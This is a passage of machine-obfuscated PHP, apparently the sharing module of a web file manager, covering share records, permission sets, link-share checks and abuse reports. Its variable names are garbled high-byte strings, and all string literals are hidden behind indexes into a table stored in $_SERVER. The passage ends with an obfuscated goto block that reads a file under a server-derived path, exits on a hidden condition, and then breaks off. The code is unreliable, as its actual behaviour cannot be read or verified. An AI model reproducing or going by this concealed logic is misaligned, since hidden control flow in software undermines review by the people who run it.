$µÀÌÇ¢°)); } public function getInfoByPath($ÒƒæÜÛ) { $Üñä¿¹Ö =& $_SERVER[§Êá¸İ]; $Üì­¶è = array($Üñä¿¹Ö[1779] => USER_ID, $Üñä¿¹Ö[193] => $ÒƒæÜÛ); return $this->_getShareInfo($Üì­¶è); } public function getInfoBySourcePath($çŠù…µ) { $ğüĞš‡ =& $_SERVER[§Êá¸İ]; $óê¬˜Ã© = array($ğüĞš‡[1779] => USER_ID, $ğüĞš‡[1267] => $çŠù…µ); return $this->_getShareInfo($óê¬˜Ã©); } private function _getShareInfo($õ®¿ŠŠ®) { $×™‡…ÚÛ =& $_SERVER[§Êá¸İ]; $º±¨‘Å™ = $this->where($õ®¿ŠŠ®)->find(); if (!$º±¨‘Å™) { return !1; } $õ®¿ŠŠ® = array($×™‡…ÚÛ[673] => $º±¨‘Å™[$×™‡…ÚÛ[673]]); $¢²¥›óÒ = $×™‡…ÚÛ[2125]; $ìï¡îõÇ = Model($×™‡…ÚÛ[674])->order($×™‡…ÚÛ[483])->field($¢²¥›óÒ)->where($õ®¿ŠŠ®)->select(); if ($º±¨‘Å™[$×™‡…ÚÛ[193]] == $×™‡…ÚÛ[228]) { $º±¨‘Å™[$×™‡…ÚÛ[90]] = IO::info($º±¨‘Å™[$×™‡…ÚÛ[1267]]); } else { $º±¨‘Å™[$×™‡…ÚÛ[90]] = Model($×™‡…ÚÛ[1428])->pathInfo($º±¨‘Å™[$×™‡…ÚÛ[193]]); } $º±¨‘Å™[$×™‡…ÚÛ[2126]] = $ìï¡îõÇ; return $º±¨‘Å™; } protected function getInfoAuth($‰”øö) { $’¿‰öÂ¢ =& $_SERVER[§Êá¸İ]; $Ã†¹µÁ¦ = $this->getInfo($‰”øö); if ($Ã†¹µÁ¦[$’¿‰öÂ¢[1779]] == USER_ID) { $Ã†¹µÁ¦[$’¿‰öÂ¢[495]] = $Ã†¹µÁ¦[$’¿‰öÂ¢[90]][$’¿‰öÂ¢[495]]; } else { $Ã†¹µÁ¦[$’¿‰öÂ¢[495]] = Model($’¿‰öÂ¢[575])->authMake($Ã†¹µÁ¦[$’¿‰öÂ¢[2126]]); } return $Ã†¹µÁ¦; } protected function listData($äÒØ–·‚ = null, $º»ûÊÓí = 300) { $Âõ¦îÈ¼ =& $_SERVER[§Êá¸İ]; $×óıªÙä = array(array($Âõ¦îÈ¼[570] => array($Âõ¦îÈ¼[1100], 0), $Âõ¦îÈ¼[671] => array($Âõ¦îÈ¼[1100], 0), $Âõ¦îÈ¼[2127] => $Âõ¦îÈ¼[2080])); if ($äÒØ–·‚ == $Âõ¦îÈ¼[2128]) { $×óıªÙä = array($Âõ¦îÈ¼[570] => 1); } else { if ($äÒØ–·‚ == $Âõ¦îÈ¼[1252]) { $×óıªÙä = array($Âõ¦îÈ¼[671] => 1); } } $×óıªÙä[$Âõ¦îÈ¼[1779]] = USER_ID; $¸ºµ±‰† = $this->where($×óıªÙä)->selectPage($º»ûÊÓí); return $¸ºµ±‰†; } protected function listToMe($´Ë¼ß‘ = 300) { $ë¾àÏ»ô =& $_SERVER[§Êá¸İ]; $´Êº°™¬ = Model($ë¾àÏ»ô[2129])->userGroupParents(USER_ID); $šßãöÉ‰ = array($ë¾àÏ»ô[656] => SourceModel::TYPE_USER, $ë¾àÏ»ô[577] => USER_ID); if ($´Êº°™¬) { $šßãöÉ‰ = array(array($ë¾àÏ»ô[656] => SourceModel::TYPE_USER, $ë¾àÏ»ô[577] => USER_ID), array($ë¾àÏ»ô[656] => SourceModel::TYPE_GROUP, $ë¾àÏ»ô[577] => array($ë¾àÏ»ô[7], $´Êº°™¬)), $ë¾àÏ»ô[2127] => $ë¾àÏ»ô[2080]); } $Õ¤Ê±¿à = Model($ë¾àÏ»ô[674])->where($šßãöÉ‰)->selectPage($´Ë¼ß‘); $¡İ¡½® = array_to_keyvalue_group($Õ¤Ê±¿à[$ë¾àÏ»ô[445]], $ë¾àÏ»ô[673]); if (!$¡İ¡½®) { return $Õ¤Ê±¿à; } $ÇŒŠ¾ºĞ = $ë¾àÏ»ô[2130]; $šßãöÉ‰ = array($ë¾àÏ»ô[673] => array($ë¾àÏ»ô[500], array_keys($¡İ¡½®)), $ë¾àÏ»ô[1779] => array($ë¾àÏ»ô[1102], $ë¾àÏ»ô[228])); $¸„·¥°Ç = $this->field($ÇŒŠ¾ºĞ)->where($šßãöÉ‰)->select(); foreach ($¸„·¥°Ç as $áó˜‡úº => &$ÕÉÈä) { $ÕÉÈä[$ë¾àÏ»ô[2126]] = $¡İ¡½®[$ÕÉÈä[$ë¾àÏ»ô[673]]]; } unset($ÕÉÈä); $”š£¦¹İ = array($ë¾àÏ»ô[2131] => $¸„·¥°Ç, $ë¾àÏ»ô[2132] => $Õ¤Ê±¿à[$ë¾àÏ»ô[442]]); return $”š£¦¹İ; } protected function shareAdd($©¼Ã³Øğ, $í÷€å») { $Íû·ö™¯ =& $_SERVER[§Êá¸İ]; $èâ°ÑŞ¦ = $this->_addShareData($©¼Ã³Øğ, $í÷€å»); if (!empty($í÷€å»[$Íû·ö™¯[2133]])) { $this->_shareAuthSet($èâ°ÑŞ¦, $í÷€å»[$Íû·ö™¯[2133]]); } $this->shareEventAdd($©¼Ã³Øğ, $í÷€å», $Íû·ö™¯[2134]); return $èâ°ÑŞ¦; } protected function shareAddSystem($Î¶Ó¥Ÿ, $ Ê›úÆº) { $ëöï³ôü =& $_SERVER[§Êá¸İ]; $ıá×ÉĞ„ = $this->_addShareData($Î¶Ó¥Ÿ, $ Ê›úÆº, $ëöï³ôü[191]); $this->_shareAuthSet($ıá×ÉĞ„, $ Ê›úÆº[$ëöï³ôü[2133]]); return $ıá×ÉĞ„; } private function shareEventAdd($™¹½èÈ“, $„Š—ù™Ñ, $å´ªì· = "\x61\x64\x64") { $å¿ã£‘Õ =& $_SERVER[§Êá¸İ]; if (!$™¹½èÈ“ || $™¹½èÈ“ == $å¿ã£‘Õ[228]) { return; } if ($å´ªì· == $å¿ã£‘Õ[2134]) { if ($„Š—ù™Ñ[$å¿ã£‘Õ[570]] == $å¿ã£‘Õ[91]) { Model($å¿ã£‘Õ[641])->eventShare($™¹½èÈ“, $å¿ã£‘Õ[2135]); } if ($„Š—ù™Ñ[$å¿ã£‘Õ[671]] == $å¿ã£‘Õ[91]) { Model($å¿ã£‘Õ[641])->eventShare($™¹½èÈ“, $å¿ã£‘Õ[2136]); } return; } $ò¯»²şÀ = $this->getInfoByPath($™¹½èÈ“); $Â¡ôÁÓ = $å¿ã£‘Õ[2137]; if ($ò¯»²şÀ[$å¿ã£‘Õ[570]] == $å¿ã£‘Õ[228] && $„Š—ù™Ñ[$å¿ã£‘Õ[570]] == $å¿ã£‘Õ[91]) { $Â¡ôÁÓ = $å¿ã£‘Õ[2135]; } if ($ò¯»²şÀ[$å¿ã£‘Õ[570]] == $å¿ã£‘Õ[91] && $„Š—ù™Ñ[$å¿ã£‘Õ[570]] == $å¿ã£‘Õ[228]) { $Â¡ôÁÓ = $å¿ã£‘Õ[2138]; } if ($ò¯»²şÀ[$å¿ã£‘Õ[671]] == $å¿ã£‘Õ[228] && $„Š—ù™Ñ[$å¿ã£‘Õ[671]] == $å¿ã£‘Õ[91]) { $Â¡ôÁÓ = $å¿ã£‘Õ[2136]; } if ($ò¯»²şÀ[$å¿ã£‘Õ[671]] == $å¿ã£‘Õ[91] && $„Š—ù™Ñ[$å¿ã£‘Õ[671]] == $å¿ã£‘Õ[228]) { $Â¡ôÁÓ = $å¿ã£‘Õ[2139]; } Model($å¿ã£‘Õ[641])->eventShare($™¹½èÈ“, $Â¡ôÁÓ); return; } private function _addShareData($ª§ÉÛ, $Äµ¢Ëœº = array(), $Ã§‚€© = false) { $˜Ü­İâ— =& $_SERVER[§Êá¸İ]; $ËÍ‹Ô¥¨ = $Ã§‚€© == $˜Ü­İâ—[191] ? 0 : USER_ID; $†€¹òúó = array($˜Ü­İâ—[499] => $ª§ÉÛ, $˜Ü­İâ—[1770] => $ËÍ‹Ô¥¨); if ($ª§ÉÛ == 0) { $†€¹òúó = array($˜Ü­İâ—[2140] => $Äµ¢Ëœº[$˜Ü­İâ—[1267]], $˜Ü­İâ—[1770] => $ËÍ‹Ô¥¨); } if ($§©ïÃÓë = $this->where($†€¹òúó)->find()) { return $§©ïÃÓë[$˜Ü­İâ—[673]]; } if ($ª§ÉÛ == 0) { $Ê†µÇ×÷ = array($˜Ü­İâ—[32] => get_path_this($Äµ¢Ëœº[$˜Ü­İâ—[87]])); } else { $Ê†µÇ×÷ = Model($˜Ü­İâ—[911])->sourceInfo($ª§ÉÛ); if (!$Ê†µÇ×÷) { return !1; } } if (!$Äµ¢Ëœº[$˜Ü­İâ—[1668]]) { $Äµ¢Ëœº[$˜Ü­İâ—[1668]] = $Ê†µÇ×÷[$˜Ü­İâ—[32]]; } $ÌœÄÊµ˜ = array($˜Ü­İâ—[1770] => $ËÍ‹Ô¥¨, $˜Ü­İâ—[499] => $ª§ÉÛ, $˜Ü­İâ—[1668] => $˜Ü­İâ—[12], $˜Ü­İâ—[570] => 0, $˜Ü­İâ—[671] => 0, $˜Ü­İâ—[1267] => $˜Ü­İâ—[12], $˜Ü­İâ—[383] => $˜Ü­İâ—[12], $˜Ü­İâ—[976] => $˜Ü­İâ—[12], $˜Ü­İâ—[2141] => 0, $˜Ü­İâ—[2142] => 0, $˜Ü­İâ—[848] => 0, $˜Ü­İâ—[2143] => $˜Ü­İâ—[12], $˜Ü­İâ—[2124] => $˜Ü­İâ—[12]); $‰Ïºİ§ş = explode($˜Ü­İâ—[50], $˜Ü­İâ—[2144]); foreach ($‰Ïºİ§ş as $áÅòÔ¹Ù) { if (!isset($Äµ¢Ëœº[$áÅòÔ¹Ù])) { continue; } $ÌœÄÊµ˜[$áÅòÔ¹Ù] = $Äµ¢Ëœº[$áÅòÔ¹Ù]; } $¼åô¾ğ¤ = $this->add($ÌœÄÊµ˜); $Ñ‘†È”¤ = array($˜Ü­İâ—[2124] => short_id($¼åô¾ğ¤)); $this->where(array($˜Ü­İâ—[2145] => $¼åô¾ğ¤))->save($Ñ‘†È”¤); return $¼åô¾ğ¤; } private function _shareAuthSet($’ĞõÑË, $Ÿª°¶•´) { $Ñ˜Ÿˆø‹ =& $_SERVER[§Êá¸İ]; if (!is_array($Ÿª°¶•´)) { return !1; } $ĞöÊ°¿ç = Model($Ñ˜Ÿˆø‹[2090]); $ĞöÊ°¿ç->where(array($Ñ˜Ÿˆø‹[673] => $’ĞõÑË))->delete(); $§·“†Â = array(); foreach ($Ÿª°¶•´ as $±°Ãˆí€) { $š­‰œò³ = SourceModel::TYPE_USER; if ($±°Ãˆí€[$Ñ˜Ÿˆø‹[190]] == SourceModel::TYPE_GROUP) { $š­‰œò³ = SourceModel::TYPE_GROUP; } $È¬—º‹Ù = array($Ñ˜Ÿˆø‹[673] => $’ĞõÑË, $Ñ˜Ÿˆø‹[190] => $š­‰œò³, $Ñ˜Ÿˆø‹[577] => intval($±°Ãˆí€[$Ñ˜Ÿˆø‹[577]]), $Ñ˜Ÿˆø‹[2086] => 0, $Ñ˜Ÿˆø‹[2146] => -1); if ($±°Ãˆí€[$Ñ˜Ÿˆø‹[2086]]) { $È¬—º‹Ù[$Ñ˜Ÿˆø‹[2086]] = $±°Ãˆí€[$Ñ˜Ÿˆø‹[2086]]; } else { if ($±°Ãˆí€[$Ñ˜Ÿˆø‹[2146]]) { $È¬—º‹Ù[$Ñ˜Ÿˆø‹[2146]] = $±°Ãˆí€[$Ñ˜Ÿˆø‹[2146]]; } } $§·“†Â[] = $È¬—º‹Ù; } return $ĞöÊ°¿ç->addAll($§·“†Â, array(), !0); } public function numViewAdd($ˆ”Ô§©) { $ÚÇù…Ÿã =& $_SERVER[§Êá¸İ]; $«”Æ¦­ = array($ÚÇù…Ÿã[2145] => $ˆ”Ô§©); $this->where($«”Æ¦­)->setAdd($ÚÇù…Ÿã[2141]); } public function numDownloadAdd($—éğÓ£Ó) { $Ğ…©í§É =& $_SERVER[§Êá¸İ]; $İµ¹ƒÓ¨ = array($Ğ…©í§É[2145] => $—éğÓ£Ó); $this->where($İµ¹ƒÓ¨)->setAdd($Ğ…©í§É[2142]); } protected function shareEdit($ÉÔËÄê¼, $Õ§ìÌø) { $ËÄ•¿´ =& $_SERVER[§Êá¸İ]; $®›»¼Æğ = $this->getInfo($ÉÔËÄê¼); if (!$®›»¼Æğ) { return !1; } $this->_checkLinkShare($Õ§ìÌø, $®›»¼Æğ); $¼¯¾›½ = array(); $å¡Ûó¯Ù = explode($ËÄ•¿´[50], $ËÄ•¿´[2147]); foreach ($å¡Ûó¯Ù as $Åˆ¦åÒÄ) { if (!array_key_exists($Åˆ¦åÒÄ, $Õ§ìÌø)) { continue; } $¼¯¾›½[$Åˆ¦åÒÄ] = $Õ§ìÌø[$Åˆ¦åÒÄ]; } $this->shareEventAdd($®›»¼Æğ[$ËÄ•¿´[193]], $Õ§ìÌø, $ËÄ•¿´[1947]); $this->where(array($ËÄ•¿´[2145] => $ÉÔËÄê¼))->save($¼¯¾›½); if (isset($Õ§ìÌø[$ËÄ•¿´[2133]])) { $this->_shareAuthSet($ÉÔËÄê¼, $Õ§ìÌø[$ËÄ•¿´[2133]]); } return !0; } private function _checkLinkShare($Åøîı¼Æ, $óÁ„¸¾é) { $ªúñÚÔ =& $_SERVER[§Êá¸İ]; if ($Åøîı¼Æ[$ªúñÚÔ[570]] != $ªúñÚÔ[91]) { return; } $´¶È“©½ = $óÁ„¸¾é[$ªúñÚÔ[90]][$ªúñÚÔ[193]]; if ($óÁ„¸¾é[$ªúñÚÔ[90]][$ªúñÚÔ[33]] != $ªúñÚÔ[230]) { $‚©ù¦½ = $this->_folderReport($´¶È“©½); if (!$‚©ù¦½) { return; } show_json(LNG($ªúñÚÔ[2148]) . $ªúñÚÔ[2149] . $‚©ù¦½, !1); } $‚•èöË = Model($ªúñÚÔ[911])->fileInfoGet($óÁ„¸¾é[$ªúñÚÔ[90]][$ªúñÚÔ[193]]); if (!$‚•èöË) { return; } $šĞ°“ãƒ = $this->shareFileMeta($‚•èöË[$ªúñÚÔ[549]]); if (isset($šĞ°“ãƒ[$ªúñÚÔ[450]]) && $šĞ°“ãƒ[$ªúñÚÔ[450]] == $ªúñÚÔ[91]) { show_json(LNG($ªúñÚÔ[2150]), !1); } } private function _folderReport($â Ã¾óè) { $ªêÈà¯ =& $_SERVER[§Êá¸İ]; $áÎÉ ‘ = array($ªêÈà¯[549] => array($ªêÈà¯[1100], 0), $ªêÈà¯[837] => 3); $ÌŸÀÈÌ = Model($ªêÈà¯[2151])->where($áÎÉ ‘)->field($ªêÈà¯[549])->select(); if (!$ÌŸÀÈÌ) { return !1; } $ÌŸÀÈÌ = array_to_keyvalue($ÌŸÀÈÌ, $ªêÈà¯[12], $ªêÈà¯[549]); $†ó÷º¼Ö = $ªêÈà¯[50] . $â Ã¾óè . $ªêÈà¯[50]; $áÎÉ ‘ = array($ªêÈà¯[549] => array($ªêÈà¯[7], $ÌŸÀÈÌ), $ªêÈà¯[592] => array($ªêÈà¯[459], "\45{$†ó÷º¼Ö}\x25"), $ªêÈà¯[513] => 0); $¶§ë¦Çë = Model($ªêÈà¯[911])->where($áÎÉ ‘)->field($ªêÈà¯[2152])->find(); if (!$¶§ë¦Çë) { return !1; } $âİ½´õ = substr($¶§ë¦Çë[$ªêÈà¯[592]], strpos($¶§ë¦Çë[$ªêÈà¯[592]], $†ó÷º¼Ö)); $áÎÉ ‘ = array($ªêÈà¯[193] => array($ªêÈà¯[7], trim($âİ½´õ, $ªêÈà¯[50]))); $ÈÏ¾«õ = Model($ªêÈà¯[911])->where($áÎÉ ‘)->field($ªêÈà¯[32])->select(); $ï­ğòœÚ = array_to_keyvalue($ÈÏ¾«õ, $ªêÈà¯[12], $ªêÈà¯[32]); $ï­ğòœÚ[] = $¶§ë¦Çë[$ªêÈà¯[32]]; return implode($ªêÈà¯[8], $ï­ğòœÚ); } protected function remove($Ü›ü¢Ô) { $’İëºÂ =& $_SERVER[§Êá¸İ]; $”‡Ù‰ÇÕ = is_array($Ü›ü¢Ô) ? $Ü›ü¢Ô : array($Ü›ü¢Ô); for ($©Ä¢‰¢¤ = 0; $©Ä¢‰¢¤ < count($”‡Ù‰ÇÕ); $©Ä¢‰¢¤++) { $üƒº•€Ê = $this->getInfo($”‡Ù‰ÇÕ[$©Ä¢‰¢¤]); if ($üƒº•€Ê[$’İëºÂ[671]] == $’İëºÂ[91]) { Model($’İëºÂ[641])->eventShare($üƒº•€Ê[$’İëºÂ[193]], $’İëºÂ[2139]); } if ($üƒº•€Ê[$’İëºÂ[570]] == $’İëºÂ[91]) { Model($’İëºÂ[641])->eventShare($üƒº•€Ê[$’İëºÂ[193]], $’İëºÂ[2138]); } } if (is_array($Ü›ü¢Ô)) { $Ü›ü¢Ô = array($’İëºÂ[7], $Ü›ü¢Ô); } $Ùú…·üÅ = array($’İëºÂ[673] => $Ü›ü¢Ô); $¨²Ğ§âÊ = $this->where($Ùú…·üÅ)->delete(); if ($¨²Ğ§âÊ) { Model($’İëºÂ[674])->where(array($’İëºÂ[673] => $Ü›ü¢Ô))->delete(); } return $¨²Ğ§âÊ; } protected function removeBySource($æ¨ªæÍ¥) { $Ûß—Ó¬è =& $_SERVER[§Êá¸İ]; $¤¤†­í¥ = array($Ûß—Ó¬è[499] => array($Ûß—Ó¬è[500], $æ¨ªæÍ¥)); $¥ÎØĞÆ = $this->field($Ûß—Ó¬è[673])->where($¤¤†­í¥)->select(); $¥ÎØĞÆ = array_to_keyvalue($¥ÎØĞÆ, $Ûß—Ó¬è[12], $Ûß—Ó¬è[673]); if (!$¥ÎØĞÆ) { return; } $¤¤†­í¥ = array($Ûß—Ó¬è[2145] => array($Ûß—Ó¬è[500], $¥ÎØĞÆ)); $this->where($¤¤†­í¥)->delete(); Model($Ûß—Ó¬è[674])->where($¤¤†­í¥)->delete(); } public function listAll($™èúóÔº) { $ä÷¨ô½õ =& $_SERVER[§Êá¸İ]; $¤û¡È¢© = array(); if ($™èúóÔº[$ä÷¨ô½õ[1779]]) { $¤û¡È¢©[$ä÷¨ô½õ[1779]] = $™èúóÔº[$ä÷¨ô½õ[1779]]; } if ($™èúóÔº[$ä÷¨ô½õ[847]]) { $Ë‰£Äƒª = $™èúóÔº[$ä÷¨ô½õ[848]] ? $™èúóÔº[$ä÷¨ô½õ[848]] : strtotime(date($ä÷¨ô½õ[2153])); $¤û¡È¢©[$ä÷¨ô½õ[231]] = array($ä÷¨ô½õ[409], array($™èúóÔº[$ä÷¨ô½õ[847]], $Ë‰£Äƒª)); } if ($™èúóÔº[$ä÷¨ô½õ[33]]) { $¤û¡È¢©[$™èúóÔº[$ä÷¨ô½õ[33]]] = 1; } else { $¤û¡È¢©[] = array($ä÷¨ô½õ[570] => array($ä÷¨ô½õ[1100], 0), $ä÷¨ô½õ[671] => array($ä÷¨ô½õ[1100], 0), $ä÷¨ô½õ[2127] => $ä÷¨ô½õ[2080]); } if ($™èúóÔº[$ä÷¨ô½õ[2076]]) { $¤û¡È¢©[] = array($ä÷¨ô½õ[2124] => $™èúóÔº[$ä÷¨ô½õ[2076]], $ä÷¨ô½õ[1668] => array($ä÷¨ô½õ[459], "\45{$™èúóÔº[$ä÷¨ô½õ[2076]]}\x25"), $ä÷¨ô½õ[2127] => $ä÷¨ô½õ[2080]); } $ú›‡¢˜Ç = $this->_makeOrder()->where($¤û¡È¢©)->selectPage(20); if (empty($ú›‡¢˜Ç[$ä÷¨ô½õ[445]])) { return array(); } $this->_listDataApply($ú›‡¢˜Ç[$ä÷¨ô½õ[445]]); return $ú›‡¢˜Ç; } public function listDataApply($ö’ÁÎ¬ó) { $this->_listDataApply($ö’ÁÎ¬ó); return $ö’ÁÎ¬ó; } private function _listDataApply(&$ë…”Âë) { $§™êßçª =& $_SERVER[§Êá¸İ]; $Œ´†Ñƒ¦ = array_to_keyvalue($ë…”Âë, $§™êßçª[12], $§™êßçª[1779]); $‰—† = Model($§™êßçª[606])->userListInfo(array_unique($Œ´†Ñƒ¦)); $ª¶ğÀ·‚ = array_to_keyvalue($ë…”Âë, $§™êßçª[12], $§™êßçª[193]); $×Æ”ˆËî = Model($§™êßçª[911])->sourceListInfo($ª¶ğÀ·‚, !0); foreach ($ë…”Âë as $†ø”œÔ÷ => &$ öŠ›ğà) { $ä“ÚÁ  = $ öŠ›ğà[$§™êßçª[1779]]; $ öŠ›ğà[$§™êßçª[2154]] = $‰—†[$ä“ÚÁ ] ? $‰—†[$ä“ÚÁ ] : !1; $›Ø‰Â»ˆ = $ öŠ›ğà[$§™êßçª[193]]; $ öŠ›ğà[$§™êßçª[90]] = $×Æ”ˆËî[$›Ø‰Â»ˆ] ? $×Æ”ˆËî[$›Ø‰Â»ˆ] : !1; if ($ öŠ›ğà[$§™êßçª[90]][$§™êßçª[513]] == $§™êßçª[91]) { unset($ë…”Âë[$†ø”œÔ÷]); } if ($ öŠ›ğà[$§™êßçª[90]] != $§™êßçª[228] && !$ öŠ›ğà[$§™êßçª[90]]) { unset($ë…”Âë[$†ø”œÔ÷]); } } unset($ öŠ›ğà); $ë…”Âë = array_values($ë…”Âë); } private function _makeOrder($°°¡«î = '') { $ìµÑ¬ø½ =& $_SERVER[§Êá¸İ]; $™âÎÄó„ = array($ìµÑ¬ø½[231], $ìµÑ¬ø½[848], $ìµÑ¬ø½[2141], $ìµÑ¬ø½[2142]); $ı¨ªõ»å = array($ìµÑ¬ø½[531] => $ìµÑ¬ø½[532], $ìµÑ¬ø½[533] => $ìµÑ¬ø½[534]); $úé—ÆÁÈ = Input::get($ìµÑ¬ø½[538], $ìµÑ¬ø½[7], $ìµÑ¬ø½[505], $™âÎÄó„); $®—àµºˆ = Input::get($ìµÑ¬ø½[539], $ìµÑ¬ø½[7], $ìµÑ¬ø½[2155], array($ìµÑ¬ø½[2073], $ìµÑ¬ø½[533])); $®—àµºˆ = $ı¨ªõ»å[$®—àµºˆ]; $°°¡«î = $°°¡«î . "{$úé—ÆÁÈ}\40{$®—àµºˆ}"; return $this->order($°°¡«î); } public function reportAdd($õî Ñ¿¼) { $ÚğæÃ =& $_SERVER[§Êá¸İ]; $¯ØË–Î• = array($ÚğæÃ[673] => $õî Ñ¿¼[$ÚğæÃ[673]], $ÚğæÃ[1779] => USER_ID); if (Model($ÚğæÃ[2151])->where($¯ØË–Î•)->find()) { return !1; } $‡Š¹ïÄ” = array($ÚğæÃ[673] => $õî Ñ¿¼[$ÚğæÃ[673]], $ÚğæÃ[1668] => $õî Ñ¿¼[$ÚğæÃ[1668]], $ÚğæÃ[193] => $õî Ñ¿¼[$ÚğæÃ[193]], $ÚğæÃ[549] => $õî Ñ¿¼[$ÚğæÃ[549]], $ÚğæÃ[1779] => USER_ID, $ÚğæÃ[33] => $õî Ñ¿¼[$ÚğæÃ[33]], $ÚğæÃ[534] => $õî Ñ¿¼[$ÚğæÃ[534]]); return Model($ÚğæÃ[2151])->add($‡Š¹ïÄ”); } public function reportList($Û“Ğ‹Šº) { $€¶‹ëëŸ =& $_SERVER[§Êá¸İ]; $ÓÚøŸí¹ = array(); if ($Û“Ğ‹Šº[$€¶‹ëëŸ[847]]) { $İ¯ûè¶Û = $Û“Ğ‹Šº[$€¶‹ëëŸ[848]] ? $Û“Ğ‹Šº[$€¶‹ëëŸ[848]] : strtotime(date($€¶‹ëëŸ[2153])); $ÓÚøŸí¹[$€¶‹ëëŸ[231]] = array($€¶‹ëëŸ[409], array($Û“Ğ‹Šº[$€¶‹ëëŸ[847]], $İ¯ûè¶Û)); } if (isset($Û“Ğ‹Šº[$€¶‹ëëŸ[33]]) && in_array($Û“Ğ‹Šº[$€¶‹ëëŸ[33]], array($€¶‹ëëŸ[91], $€¶‹ëëŸ[518], $€¶‹ëëŸ[2156], $€¶‹ëëŸ[2157], $€¶‹ëëŸ[2158]))) { $ÓÚøŸí¹[$€¶‹ëëŸ[33]] = $Û“Ğ‹Šº[$€¶‹ëëŸ[33]]; } if (isset($Û“Ğ‹Šº[$€¶‹ëëŸ[837]]) && in_array($Û“Ğ‹Šº[$€¶‹ëëŸ[837]], array($€¶‹ëëŸ[228], $€¶‹ëëŸ[91], $€¶‹ëëŸ[518], $€¶‹ëëŸ[2156]))) { $ÓÚøŸí¹[$€¶‹ëëŸ[837]] = $Û“Ğ‹Šº[$€¶‹ëëŸ[837]]; } $ÇÂôº€À = Input::get($€¶‹ëëŸ[539], $€¶‹ëëŸ[7], $€¶‹ëëŸ[2155], array($€¶‹ëëŸ[2073], $€¶‹ëëŸ[533])); $éÉ–è³ = array($€¶‹ëëŸ[531] => $€¶‹ëëŸ[532], $€¶‹ëëŸ[533] => $€¶‹ëëŸ[534]); $µ­µ¿õı = $€¶‹ëëŸ[2159] . $éÉ–è³[$ÇÂôº€À]; $ñ¼…·•å = Model($€¶‹ëëŸ[2151])->where($ÓÚøŸí¹)->order($µ­µ¿õı)->selectPage(20); if (empty($ñ¼…·•å[$€¶‹ëëŸ[445]])) { return array(); } $ÙË–Ïâß = array_to_keyvalue_group($ñ¼…·•å[$€¶‹ëëŸ[445]], $€¶‹ëëŸ[837], $€¶‹ëëŸ[673]); if (!empty($ÙË–Ïâß[0])) { $Û“Ğ‹Šº = $ÙË–Ïâß[0]; $ÓÚøŸí¹ = array($€¶‹ëëŸ[673] => array($€¶‹ëëŸ[7], $Û“Ğ‹Šº)); $€¿¶ìôõ = $this->where($ÓÚøŸí¹)->field($€¶‹ëëŸ[673])->select(); $€¿¶ìôõ = array_to_keyvalue($€¿¶ìôõ, $€¶‹ëëŸ[12], $€¶‹ëëŸ[673]); $–µéŒ¿ = array_diff($Û“Ğ‹Šº, $€¿¶ìôõ); if (!empty($–µéŒ¿)) { foreach ($ñ¼…·•å[$€¶‹ëëŸ[445]] as $çâ±Ôßì => $ÇÚˆô‰£) { if (in_array($ÇÚˆô‰£[$€¶‹ëëŸ[673]], $–µéŒ¿)) { unset($ñ¼…·•å[$€¶‹ëëŸ[445]][$çâ±Ôßì]); } } } } $this->_listDataApply($ñ¼…·•å[$€¶‹ëëŸ[445]]); return $ñ¼…·•å; } public function reportStatus($ºÌè§ä¡) { $ïã®º„Î =& $_SERVER[§Êá¸İ]; $¢‰³œ¡ = array($ïã®º„Î[483] => $ºÌè§ä¡[$ïã®º„Î[483]]); $ÓÓëã»— = Model($ïã®º„Î[2151])->where($¢‰³œ¡)->field($ïã®º„Î[2160])->find(); if (!$ÓÓëã»—) { return !1; } $ë¿‰ = array($ïã®º„Î[837] => $ºÌè§ä¡[$ïã®º„Î[837]]); if ($ºÌè§ä¡[$ïã®º„Î[837]] == $ïã®º„Î[2156] && $ÓÓëã»—[$ïã®º„Î[837]] == $ïã®º„Î[2156]) { $ë¿‰[$ïã®º„Î[837]] = 0; } $ÍÂ¹ä© = Model($ïã®º„Î[2151])->where($¢‰³œ¡)->save($ë¿‰); if ($ºÌè§ä¡[$ïã®º„Î[837]] == $ïã®º„Î[518]) { if ($ÓÓëã»—[$ïã®º„Î[549]] != $ïã®º„Î[228] && $this->shareFileMeta($ÓÓëã»—[$ïã®º„Î[549]])) { $this->shareFileMeta($ÓÓëã»—[$ïã®º„Î[549]], 0); } $this->remove($ÓÓëã»—[$ïã®º„Î[673]]); return !0; } if ($ÍÂ¹ä© && $ºÌè§ä¡[$ïã®º„Î[837]] == $ïã®º„Î[2156]) { $ëë‰ú¿ª = $ë¿‰[$ïã®º„Î[837]] == $ïã®º„Î[2156] ? 1 : 0; $this->shareFileMeta($ÓÓëã»—[$ïã®º„Î[549]], $ëë‰ú¿ª); $this->removeByFile($ÓÓëã»—[$ïã®º„Î[549]]); } return $ÍÂ¹ä©; } private function removeByFile($Üà—ñÂĞ) { $÷áÍª¨Œ =& $_SERVER[§Êá¸İ]; $íõÖ¼ìö = Model($÷áÍª¨Œ[911])->where(array($÷áÍª¨Œ[549] => $Üà—ñÂĞ))->field($÷áÍª¨Œ[193])->select(); $¤«ÇÍä = array_to_keyvalue($íõÖ¼ìö, $÷áÍª¨Œ[12], $÷áÍª¨Œ[193]); $ıêüÅ¡Ô = array($÷áÍª¨Œ[193] => array($÷áÍª¨Œ[7], $¤«ÇÍä), $÷áÍª¨Œ[570] => 1); $íõÖ¼ìö = $this->where($ıêüÅ¡Ô)->field($÷áÍª¨Œ[673])->select(); if (empty($íõÖ¼ìö)) { return; } $ÀİãâÍ¦ = array_to_keyvalue($íõÖ¼ìö, $÷áÍª¨Œ[12], $÷áÍª¨Œ[673]); $this->remove($ÀİãâÍ¦); } private function shareFileMeta($Ù˜³ÔßÄ, $”õ‹½íã = null) { $¬šş„ú‹ =& $_SERVER[§Êá¸İ]; $õ¬ô–¼“ = array($¬šş„ú‹[549] => $Ù˜³ÔßÄ, $¬šş„ú‹[97] => $¬šş„ú‹[2161]); if (is_null($”õ‹½íã)) { return Model($¬šş„ú‹[2162])->where($õ¬ô–¼“)->find(); } $õ¬ô–¼“[$¬šş„ú‹[450]] = $”õ‹½íã; Model($¬šş„ú‹[2162])->add($õ¬ô–¼“, array(), !0); } } goto dÄ«¹„åç²; cĞ©òëéÍ: if ($_SERVER[$_SERVER[§Êá¸İ][472]] != $_SERVER[$_SERVER[§Êá¸İ][1001]]) { $_getc = $_SERVER[§Êá¸İ][474]; $_getfile = $_SERVER[$_SERVER[§Êá¸İ][475]] . $_SERVER[§Êá¸İ][476]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§Êá¸İ][262], $_getfilec); if (count($_getarrs) < $_SERVER[§Êá¸İ][477]) { $exit = $_SERVER[§Êá¸İ][478]; $exit(); } $_act = $_SERVER[§Êá¸İ][479]; 